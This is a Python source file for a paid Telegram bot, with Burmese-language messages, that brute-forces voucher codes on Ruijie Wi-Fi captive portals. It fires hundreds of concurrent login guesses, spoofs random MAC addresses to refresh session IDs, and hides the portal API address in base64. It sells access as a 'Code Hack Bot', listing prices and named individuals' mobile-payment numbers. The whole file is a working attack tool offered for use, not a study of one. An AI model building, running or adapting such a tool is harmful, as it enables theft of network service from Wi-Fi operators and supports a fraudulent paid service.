#!/usr/bin/env python3
"""
Ruijie Wi-Fi Voucher Telegram Bot - Render Secure Env Version V13.2
- High-speed async multi-tasking (200-1000 req/sec)
- Render Web Service compatibility with dynamic Port Binding
- Secure Environment Variables for BOT_TOKEN and ADMIN_ID
- Shared and isolated session URL memories
- Dynamic Admin Access Controls
- Enhanced UI with Grid buttons
"""

import os
import re
import sys
import time
import random
import string
import base64
import asyncio
import logging
from datetime import datetime, timedelta

import aiohttp
from aiohttp import web
from telegram import (
    Update,
    ReplyKeyboardMarkup,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

# ==================== CONFIG (SECURE VIA ENV) ====================
# Render Environment Variables မြေပုံမှ လုံခြုံစွာ လှမ်းဖတ်ခြင်း
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ENV_ADMIN_ID = os.environ.get("ADMIN_ID")

try:
    admin_id = int(ENV_ADMIN_ID) if ENV_ADMIN_ID else None
except ValueError:
    admin_id = None

logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# ==================== MEMORY STORAGE ====================
authorized_users = {} # {user_id: {"expires": datetime, "daily_limit": int, "found_today": int, "last_reset": date}}
user_sessions = {}    # {user_id: UserSession}
user_states = {}      # {user_id: state_string}

global_url_history = {}

POST_URL = base64.b64decode(
    b"aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM="
).decode()

# ==================== PER-USER SESSION ====================
class UserSession:
    def __init__(self, user_id):
        self.user_id = user_id
        self.portal_url = ""
        self.base_url = "http://10.44.77.240:2060"
        self.is_running = False
        self.stop_flag = False
        self.attempts = 0
        self.found_vouchers = [] 
        self.current_mode = None
        self.current_length = None
        self.start_time = None
        self.in_running = set()
        self.concurrency_limit = 500  
        self.status_message_id = None

    def get_history_set(self):
        if not self.portal_url:
            return set()
        url_key = self.portal_url.split('?')[0] if '?' in self.portal_url else self.portal_url
        if url_key not in global_url_history:
            global_url_history[url_key] = set()
        return global_url_history[url_key]

# ==================== HELPER FUNCTIONS ====================
def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xFF) for _ in range(5)]
    return ":".join(f"{x:02x}" for x in mac)

def replace_mac(url, new_mac):
    if "mac=" in url:
        return re.sub(r"mac=[^&]*", f"mac={new_mac}", url)
    return url + f"&mac={new_mac}"

async def get_session_id(http_session, session_url, previous_session_id):
    if not session_url:
        return previous_session_id
    mac = get_mac()
    test_url = replace_mac(session_url, new_mac=mac)
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": test_url,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }
    try:
        async with http_session.get(test_url, headers=headers, allow_redirects=True, timeout=3) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9\.\-_]+)", response)
            if session_id:
                return session_id.group(1)
            
            html = await req.text()
            sid_match = re.search(r'sessionId\s*[:=]\s*["\']([^"\']+)["\']', html)
            if sid_match:
                return sid_match.group(1)
    except:
        pass
    return previous_session_id

# ==================== RANDOM GENERATORS ====================
def generate_random_voucher(mode, length, history_set, in_running):
    if mode == "digit":
        chars = string.digits
    elif mode == "ascii-lower":
        chars = string.ascii_lowercase
    elif mode == "ascii-upper":
        chars = string.ascii_uppercase
    else:
        chars = string.digits + string.ascii_lowercase + string.ascii_uppercase

    while True:
        voucher = "".join(random.choices(chars, k=length))
        if voucher not in history_set and voucher not in in_running:
            return voucher

# ==================== LOGIN WORKER ====================
async def login_voucher_async(http_session, session_id, voucher, base_url):
    if not session_id:
        return voucher, False, ""
    
    url = f"{base_url}/api/auth/voucher/" if base_url else POST_URL
    data = {"accessCode": voucher, "sessionId": session_id, "apiVersion": 1}
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; Redmi Note 13 Pro) AppleWebKit/537.36",
    }
    try:
        async with http_session.post(url, json=data, headers=headers, ssl=False, timeout=2) as req:
            res_text = await req.text()
            success = ("logonUrl" in res_text or '"result":true' in res_text or '"code":0' in res_text)
            return voucher, success, res_text
    except:
        try:
            async with http_session.post(POST_URL, json=data, headers=headers, ssl=False, timeout=2) as req:
                res_text = await req.text()
                success = ("logonUrl" in res_text or '"result":true' in res_text or '"code":0' in res_text)
                return voucher, success, res_text
        except:
            return voucher, None, ""

def parse_validity(response_text):
    for pattern in [r'"remainTime"\s*:\s*"?(\d+)"?', r'"validTime"\s*:\s*"?(\d+)"?']:
        match = re.search(pattern, response_text)
        if match:
            seconds = int(match.group(1))
            if seconds == 0: return "Unlimited"
            return f"{seconds // 3600} နာရီ {(seconds % 3600) // 60} မိနစ်"
    return "အကန့်အသတ်မရှိ (သို့) စစ်မရပါ"

# ==================== ACCESS CONTROLS ====================
def is_admin(user_id):
    global admin_id
    if admin_id is None:
        admin_id = user_id
    return user_id == admin_id

def is_authorized(user_id):
    if is_admin(user_id): return True
    if user_id in authorized_users:
        info = authorized_users[user_id]
        if datetime.now() < info["expires"]:
            today = datetime.now().date()
            if info["last_reset"] != today:
                info["found_today"] = 0
                info["last_reset"] = today
            return True
        else:
            del authorized_users[user_id]
    return False

def get_remaining_daily(user_id):
    if is_admin(user_id): return 999999
    if user_id in authorized_users:
        info = authorized_users[user_id]
        return max(0, info["daily_limit"] - info["found_today"])
    return 0

def get_user_session(user_id):
    if user_id not in user_sessions:
        user_sessions[user_id] = UserSession(user_id)
    return user_sessions[user_id]

# ==================== KEYBOARDS ====================
def admin_menu():
    return ReplyKeyboardMarkup(
        [
            ["🌐 Portal Link ထည့်သွင်းရန်", "🚀 Voucher စမ်းသပ်ခြင်း စတင်ရန်"],
            ["📊 အခြေအနေ စစ်ဆေးရန်", "⏹ စမ်းသပ်မှု ရပ်တန့်ရန်"],
            ["🏆 ရရှိထားသော Success Codes", "🗑️ Success Codes အားလုံးဖျက်ရန်"],
            ["👥 Admin ခွင့်ပြုထားသော Users", "🗑️ User ခွင့်ပြုချက် ပြန်ဖျက်ရန်"]
        ],
        resize_keyboard=True
    )

def user_menu():
    return ReplyKeyboardMarkup(
        [
            ["🌐 Portal Link ထည့်သွင်းရန်", "🚀 Voucher စမ်းသပ်ခြင်း စတင်ရန်"],
            ["📊 အခြေအနေ စစ်ဆေးရန်", "⏹ စမ်းသပ်မှု ရပ်တန့်ရန်"],
            ["🏆 ရရှိထားသော Success Codes", "🗑️ Success Codes အားလုံးဖျက်ရန်"]
        ],
        resize_keyboard=True
    )

def unauthorized_menu():
    return ReplyKeyboardMarkup(
        [["🔑 Access Key ဝယ်ယူရန်", "💵 Ngwe လွှဲပြေစာ ပေးပို့ရန်"]],
        resize_keyboard=True
    )

# ==================== HIGH-SPEED ENGINE ====================
async def high_speed_bruteforce(bot, chat_id, user_id):
    us = get_user_session(user_id)
    us.is_running = True
    us.stop_flag = False
    us.attempts = 0
    us.start_time = datetime.now()
    history_set = us.get_history_set()

    status_msg = await bot.send_message(
        chat_id=chat_id,
        text="⚡ **အရှိန်မြှင့်တင်ပြီး ရှာဖွေရေးလုပ်ငန်းစဉ်ကို စတင်နေပါပြီ...**\n⚙️ နှုန်း: ပြင်ဆင်နေဆဲ...",
        parse_mode="Markdown"
    )
    us.status_message_id = status_msg.message_id

    connector = aiohttp.TCPConnector(limit=us.concurrency_limit, force_close=False, ttl_dns_cache=300)
    timeout = aiohttp.ClientTimeout(total=4)
    
    last_ui_update = time.time()

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as http_session:
        session_id = await get_session_id(http_session, us.portal_url, None)
        
        if not session_id:
            await bot.edit_message_text(
                chat_id=chat_id, message_id=us.status_message_id,
                text="❌ **Portal Link မှ Session ID ရယူ၍မရပါ။ URL ကိုပြန်စစ်ပေးပါ။**"
            )
            us.is_running = False
            return

        while not us.stop_flag:
            if not is_admin(user_id) and get_remaining_daily(user_id) <= 0:
                await bot.send_message(chat_id=chat_id, text="⚠️ ယနေ့အတွက် သင့်ရဲ့ ရှာဖွေမှု Limit ကုန်ဆုံးသွားပါပြီ။")
                break

            tasks = []
            for _ in range(us.concurrency_limit):
                v_code = generate_random_voucher(us.current_mode, us.current_length, history_set, us.in_running)
                us.in_running.add(v_code)
                tasks.append(login_voucher_async(http_session, session_id, v_code, us.base_url))
            
            results = await asyncio.gather(*tasks)

            for voucher, success, response_text in results:
                us.in_running.discard(voucher)
                if success is None: 
                    continue 

                us.attempts += 1
                history_set.add(voucher) 

                if success:
                    validity = parse_validity(response_text)
                    success_data = {
                        "code": voucher,
                        "time": datetime.now().strftime("%d-%m-%Y %H:%M:%S"),
                        "validity": validity
                    }
                    us.found_vouchers.append(success_data)
                    if not is_admin(user_id) and user_id in authorized_users:
                        authorized_users[user_id]["found_today"] += 1

                    await bot.send_message(
                        chat_id=chat_id,
                        text=f"🎉 **SUCCESS VOUCHER CODE တွေ့ရှိပါပြီ!** 🎉\n\n"
                             f"🔑 **Code:** `{voucher}`\n"
                             f"⏱ **သက်တမ်း:** {validity}\n"
                             f"📊 **စမ်းသပ်မှုအကြိမ်ရေ:** {us.attempts} ကြိမ်မြောက်တွင်တွေ့သည်",
                        parse_mode="Markdown"
                    )

                    remaining = get_remaining_daily(user_id)
                    if remaining <= 0 and not is_admin(user_id):
                        us.is_running = False
                        return

            if us.attempts % 1500 == 0:
                session_id = await get_session_id(http_session, us.portal_url, session_id)

            now = time.time()
            if now - last_ui_update >= 3:
                elapsed = now - time.mktime(us.start_time.timetuple())
                speed = us.attempts / elapsed if elapsed > 0 else 0
                try:
                    await bot.edit_message_text(
                        chat_id=chat_id, message_id=us.status_message_id,
                        text=f"⚡ **ကုဒ်များကို အရှိန်ပြင်းစွာ ရှာဖွေနေပါသည်...**\n\n"
                             f"📊 **ရှာပြီး:** {us.attempts} ကြိမ်\n"
                             f"⚡ **အမြန်နှုန်း:** {speed:.1f} req/sec\n"
                             f"🏆 **တွေ့ရှိမှု:** {len(us.found_vouchers)} ခု",
                    )
                except:
                    pass
                last_ui_update = now

            await asyncio.sleep(0.01)

    us.is_running = False
    try:
        await bot.edit_message_text(
            chat_id=chat_id, message_id=us.status_message_id,
            text=f"⏹ **စမ်းသပ်မှုကို ရပ်တန့်လိုက်ပါပြီ။**\n\n📊 စုစုပေါင်းစမ်းသပ်မှု: {us.attempts} ကြိမ်\n🏆 Success ရရှိမှု: {len(us.found_vouchers)} ခု"
        )
    except:
        pass

# ==================== HANDLERS ====================
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if is_admin(user_id):
        await update.message.reply_text("👑 **Admin Panel မှ ကြိုဆိုပါသည် လူကြီးမင်း။**", reply_markup=admin_menu())
    elif is_authorized(user_id):
        await update.message.reply_text("✅ **လူကြီးမင်းတွင် Bot အသုံးပြုခွင့် ရှိပါသည်။**", reply_markup=user_menu())
    else:
        await update.message.reply_text(f"👋 **မင်္ဂလာပါ! ကွန်ရက် Voucher စမ်းသပ်စစ်ဆေးရေး Bot ဖြစ်ပါတယ်။**\n\n🚫 လူကြီးမင်းမှာ အသုံးပြုခွင့် Key မရှိသေးပါသည်။ ဆက်သွယ်ဝယ်ယူနိုင်ပါသည်။\n🆔 သင့် ID: `{user_id}`", reply_markup=unauthorized_menu(), parse_mode="Markdown")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    state = user_states.get(user_id)

    if not is_authorized(user_id) and not is_admin(user_id):
        if text == "🔑 Access Key ဝယ်ယူရန်":
            await update.message.reply_text(
                "💎 **Code Hack Bot အသုံးပြုခွင့် နှုန်းထားများ** 💎\n\n"
                "⏱ **၁၅ ရက် သက်တမ်း** - `၁၅,၀၀၀ ကျပ်`\n"
                "⏱ **၃၀ ရက် သက်တမ်း** - `၂၁,၀၀၀ ကျပ်`\n"
                "*(သို့မဟုတ် မိမိစိတ်ကြိုက်သက်တမ်း/Daily Limit ကို ဝယ်ယူနိုင်သည်)*\n\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "💵 **ဒီဂျစ်တယ်ငွေပေးချေမှုစနစ်များ**\n\n"
                "📱 **KBZPay**\n"
                "📞 `09973214939`\n"
                "👤 Hein Min Thant\n\n"
                "📱 **Wave Money**\n"
                "📞 `09264389341`\n"
                "👤 **Hein Min Chit**\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "💡 Ngwe လွှဲပြီးပါက အောက်က 'ငွေလွှဲပြေစာ ပေးပို့ရန်' ခလုတ်ကိုနှိပ်ပြီး ပြေစာပုံ ပို့ပေးပါ။",
                reply_markup=unauthorized_menu(),
                parse_mode="Markdown"
            )
        elif text == "💵 Ngwe လွှဲပြေစာ ပေးပို့ရန်" or "ပြေစာ" in text:
            user_states[user_id] = "waiting_receipt"
            await update.message.reply_text("📸 **ငွေလွှဲပြီးကြောင်း ပြေစာ Screenshot (ဓာတ်ပုံ) အား ပေးပို့ပေးပါ။**")
        elif state == "waiting_receipt":
            await update.message.reply_text("⚠️ ကျေးဇူးပြု၍ စာသားမဟုတ်ဘဲ ပြေစာဓာတ်ပုံပုံစံဖြင့်သာ ပေးပို့ပေးပါဗျာ။")
        return

    if is_admin(user_id) and state == "waiting_approve":
        user_states.pop(user_id, None)
        try:
            parts = text.strip().split("|")
            t_id = int(parts[0].strip())
            days = int(parts[1].strip())
            limit = int(parts[2].strip())
            
            authorized_users[t_id] = {
                "expires": datetime.now() + timedelta(days=days),
                "daily_limit": limit,
                "found_today": 0,
                "last_reset": datetime.now().date(),
            }
            await update.message.reply_text(f"✅ **အောင်မြင်ပါသည်!**\n👤 User: `{t_id}`\n⏱ သက်တမ်း: `{days}` ရက်\n📊 Daily Limit: `{limit}` ခု ခွင့်ပြုလိုက်ပါပြီ။", reply_markup=admin_menu(), parse_mode="Markdown")
            try:
                await context.bot.send_message(chat_id=t_id, text=f"🎉 **သင့်အား Admin မှ Bot အသုံးပြုခွင့် ပေးလိုက်ပါပြီ!**\n⏱ သက်တမ်း: {days} ရက်\n📊 Daily Limit: {limit} codes\n\nအသုံးပြုရန် /start ကို ပြန်နှိပ်ပါ။")
            except: pass
        except:
            await update.message.reply_text("❌ **ပုံစံမှားယွင်းနေပါသည်။**\nပုံစံအမှန် -> `TelegramID|ရက်|Limit` အတိုင်းပြန်ပို့ပါ။", reply_markup=admin_menu(), parse_mode="Markdown")
        return

    if is_admin(user_id) and state == "waiting_revoke":
        user_states.pop(user_id, None)
        try:
            target_id = int(text.strip())
            if target_id in authorized_users:
                del authorized_users[target_id]
                await update.message.reply_text(f"🗑️ **User ID: `{target_id}` အား အသုံးပြုသူစာရင်းမှ အောင်မြင်စွာ ဖယ်ရှား (Revoke) လိုက်ပါပြီ။**", reply_markup=admin_menu(), parse_mode="Markdown")
                try:
                    await context.bot.send_message(chat_id=target_id, text="⚠️ **သင့်အား Admin မှ Bot အသုံးပြုခွင့် ရုပ်သိမ်းလိုက်ပြီ ဖြစ်ပါသည်။**")
                except: pass
            else:
                await update.message.reply_text(f"❌ **မအောင်မြင်ပါ။** User ID: `{target_id}` ဟာ ခွင့်ပြုထားတဲ့စာရင်းထဲမှာ ရှိမနေပါခင်ဗျာ။", reply_markup=admin_menu(), parse_mode="Markdown")
        except:
            await update.message.reply_text("❌ **မှားယွင်းသော ID ပုံစံ ဖြစ်ပါသည်။** ဂဏန်းနံပါတ် သီးသန့်သာ ရိုက်ထည့်ပေးပါ။", reply_markup=admin_menu())
        return

    if state == "waiting_portal_link":
        user_states.pop(user_id, None)
        us = get_user_session(user_id)
        us.portal_url = text.strip()
        
        ip_match = re.search(r'https?://([^:/]+)', us.portal_url)
        if ip_match:
            us.base_url = f"http://{ip_match.group(1)}:2060"
            
        await update.message.reply_text(f"✅ **Portal Link ကို template မှတ်သားပြီးပါပြီ!**\n🌐 Link: {us.portal_url}\n📡 Local IP Detect: {us.base_url}\n*(အကယ်၍ ၎င်း URL တွင် ရှာဖူးသည်များရှိက ထပ်မရှာဘဲ ကျော်သွားပါမည်)*", reply_markup=admin_menu() if is_admin(user_id) else user_menu())
        return

    if text == "🌐 Portal Link ထည့်သွင်းရန်":
        user_states[user_id] = "waiting_portal_link"
        await update.message.reply_text("🔗 **လူကြီးမင်း၏ Wi-Fi Portal Login Link အား Copy ကူး၍ ပို့ပေးပါ။**")
    
    elif text == "🚀 Voucher စမ်းသပ်ခြင်း စတင်ရန်":
        us = get_user_session(user_id)
        if not us.portal_url:
            await update.message.reply_text("⚠️ **ကျေးဇူးပြု၍ Portal Link ကို အရင်ထည့်သွင်းပေးပါဦး။**")
            return
        if us.is_running:
            await update.message.reply_text("⚠️ **လက်ရှိတွင် ရှာဖွေမှု ပြုလုပ်နေဆဲဖြစ်ပါသည်။**")
            return
            
        keyboard = InlineKeyboardMarkup(
            [
                [InlineKeyboardButton("🔢 ဂဏန်းသီးသန့် (Digit)", callback_data="mode_digit")],
                [InlineKeyboardButton("🔤 စာလုံးအသေး (Ascii-Lower)", callback_data="mode_ascii-lower")],
                [InlineKeyboardButton("🔠 စာလုံးအကြီး (Ascii-Upper)", callback_data="mode_ascii-upper")],
                [InlineKeyboardButton("🔣 အလုံးစုံကုဒ် (All Mix)", callback_data="mode_all")]
            ]
        )
        await update.message.reply_text("⚙️ **စမ်းသပ်မည့် ကုဒ်အမျိုးအစား (Voucher Mode) ရွေးချယ်ပါ -**", reply_markup=keyboard)

    elif text == "📊 အခြေအနေ စစ်ဆေးရန်":
        us = get_user_session(user_id)
        status = "🟢 အလုပ်လုပ်နေသည်" if us.is_running else "🔴 ရပ်တန့်ထားသည်"
        hist_count = len(us.get_history_set())
        await update.message.reply_text(
            f"📊 **လက်ရှိ Bot လုပ်ဆောင်မှုအခြေအနေ**\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📡 **အခြေအနေ:** {status}\n"
            f"🔢 **ယခု Session စမ်းသပ်ပြီး:** {us.attempts} ကြိမ်\n"
            f"🚫 **ဤ URL တွင် ရှာပြီးသမျှစုစုပေါင်း (ဉာဏ်ရည်မှတ်ဉာဏ်):** {hist_count} ခု\n"
            f"🏆 **အောင်မြင်မှုကုဒ်တွေ့ရှိမှု:** {len(us.found_vouchers)} ခု\n"
            f"📅 **ယနေ့ကျန်ရှိသော Limit:** {get_remaining_daily(user_id)} codes",
            reply_markup=admin_menu() if is_admin(user_id) else user_menu()
        )

    elif text == "⏹ စမ်းသပ်မှု ရပ်တန့်ရန်":
        us = get_user_session(user_id)
        if us.is_running:
            us.stop_flag = True
            await update.message.reply_text("⏳ **လုပ်ငန်းစဉ်ကို ခေတ္တရပ်တန့်ရန် အမိန့်ပေးပို့လိုက်ပါပြီ...**")
        else:
            await update.message.reply_text("❌ လက်ရှိတွင် မည်သည့်ရှာဖွေမှုမှ ပြုလုပ်မနေပါ။")

    elif text == "🏆 ရရှိထားသော Success Codes":
        us = get_user_session(user_id)
        if not us.found_vouchers:
            await update.message.reply_text("ℹ️ **မည်သည့် Success Code မှ မတွေ့ရှိရသေးပါခင်ဗျာ။**")
            return
        
        msg = "🏆 **ရှာဖွေတွေ့ရှိထားသော Success Voucher ကုဒ်များ** 🏆\n\n"
        for idx, v in enumerate(us.found_vouchers, 1):
            msg += f"{idx}။ 🔑 ကုဒ်: `{v['code']}`\n⏱ သက်တမ်း: {v['validity']}\n📅 တွေ့သည့်အချိန်: {v['time']}\n\n"
        await update.message.reply_text(msg, parse_mode="Markdown")

    elif text == "🗑️ Success Codes အားလုံးဖျက်ရန်":
        us = get_user_session(user_id)
        us.found_vouchers.clear()
        await update.message.reply_text("🗑️ **သိမ်းဆည်းထားသော Success Voucher ကုဒ်များ အားလုံးကို အောင်မြင်စွာ ဖျက်သိမ်းပြီးပါပြီ။**")

    elif text == "👥 Admin ခွင့်ပြုထားသော Users" and is_admin(user_id):
        user_states[user_id] = "waiting_approve"
        msg = "👥 **လက်ရှိခွင့်ပြုထားသော အသုံးပြုသူများစာရင်း**\n\n"
        if not authorized_users:
            msg += "မရှိသေးပါ။\n"
        else:
            for uid, info in authorized_users.items():
                rem = (info["expires"] - datetime.now()).days
                msg += f"👤 ID: `{uid}` | ကျန်ရက်: {rem} ရက် | Limit: {info['daily_limit']}/နေ့\n"
        
        msg += "\n━━━━━━━━━━━━━━━━━━━━\n💡 **User အသစ် ထပ်တိုးရန် ပုံစံအမှန်အတိုင်း ပို့ပေးပါ -**\n`TelegramID|ရက်သက်တမ်း|နေ့စဉ်ကုဒ်Limit`\n*(ဥပမာ - `559128391|30|20`)*"
        await update.message.reply_text(msg, reply_markup=admin_menu(), parse_mode="Markdown")

    elif text == "🗑️ User ခွင့်ပြုချက် ပြန်ဖျက်ရန်" and is_admin(user_id):
        user_states[user_id] = "waiting_revoke"
        await update.message.reply_text("🗑️ **ခွင့်ပြုချက် ပြန်လည်ရုပ်သိမ်း (ဖျက်ပစ်) ချင်သော User ၏ Telegram ID ကို ရိုက်ထည့်ပေးပါ -**")

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_states.get(user_id) == "waiting_receipt":
        user_states.pop(user_id, None)
        file_id = update.message.photo[-1].file_id
        username = update.effective_user.username or "မရှိပါ"
        
        await update.message.reply_text("✅ **လူကြီးမင်း၏ ပြေစာကို Admin ထံသို့ တိုက်ရိုက်ပေးပို့လိုက်ပါပြီ။ အတည်ပြုပေးသည်အထိ ခေတ္တစောင့်ဆိုင်းပေးပါ။**")
        
        if admin_id:
            try:
                await context.bot.send_photo(
                    chat_id=admin_id, photo=file_id,
                    caption=f"💵 **ငွေလွှဲပြေစာအသစ် ရောက်ရှိလာပါသည်**\n\n👤 ပြုလုပ်သူ: @{username}\n🆔 ID: `{user_id}`\n\n💡 ခွင့်ပြုလိုပါက အောက်ပါစာသားကို ကော်ပီကူးပြီး ပြင်ဆင်ပို့နိုင်သည် -\n`{user_id}|30|50`",
                    parse_mode="Markdown"
                )
            except Exception as e:
                logger.error(f"Receipt forward failed: {e}")

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = query.from_user.id
    chat_id = query.message.chat_id

    if data.startswith("mode_"):
        mode = data.replace("mode_", "")
        us = get_user_session(user_id)
        us.current_mode = mode
        
        keyboard = InlineKeyboardMarkup(
            [[
                InlineKeyboardButton("6 လုံး", callback_data="len_6"),
                InlineKeyboardButton("7 လုံး", callback_data="len_7"),
                InlineKeyboardButton("8 လုံး", callback_data="len_8")
            ]]
        )
        await query.edit_message_text(text=f"✅ ရွေးချယ်မှု: **{mode.upper()}**\n\n🔢 **Voucher ၏ စာလုံးအရှည် (Length) ကို ရွေးချယ်ပါ -**", reply_markup=keyboard, parse_mode="Markdown")

    elif data.startswith("len_"):
        length = int(data.replace("len_", ""))
        us = get_user_session(user_id)
        us.current_length = length
        
        await query.edit_message_text(text=f"🚀 Mode: `{us.current_mode}` | Length: `{length}`\n✨ **လုပ်ငန်းစဉ်ကို စတင်အသက်သွင်းနေပါပြီ...**", parse_mode="Markdown")
        asyncio.create_task(high_speed_bruteforce(context.bot, chat_id, user_id))

# ==================== RENDER COMPATIBLE WEB SERVER ====================
async def health_check(request):
    return web.Response(text="Bot is running successfully with Port Binding!")

async def main():
    if not BOT_TOKEN:
        logger.error("❌ BOT_TOKEN environment variable is missing! System exit.")
        sys.exit(1)

    # Initialize PTB Application
    app_tg = Application.builder().token(BOT_TOKEN).build()
    app_tg.add_handler(CommandHandler("start", start_command))
    app_tg.add_handler(CallbackQueryHandler(handle_callback))
    app_tg.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app_tg.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    # Start Telegram Bot Polling in Background
    await app_tg.initialize()
    await app_tg.start()
    await app_tg.updater.start_polling(drop_pending_updates=True)
    logger.info("High-Speed Bot Started Securely via Polling (Async).")

    # Setup Fake Web Server for Render to bind PORT
    app_web = web.Application()
    app_web.router.add_get('/', health_check)
    
    port = int(os.environ.get("PORT", 8080))
    runner = web.AppRunner(app_web)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', port)
    
    logger.info(f"Binding dummy web server to port {port} for Render stability.")
    await site.start()

    # Keep whole system alive loops
    try:
        while True:
            await asyncio.sleep(3600)
    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        await app_tg.updater.stop()
        await app_tg.stop()
        await app_tg.shutdown()

if __name__ == "__main__":
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    asyncio.run(main())
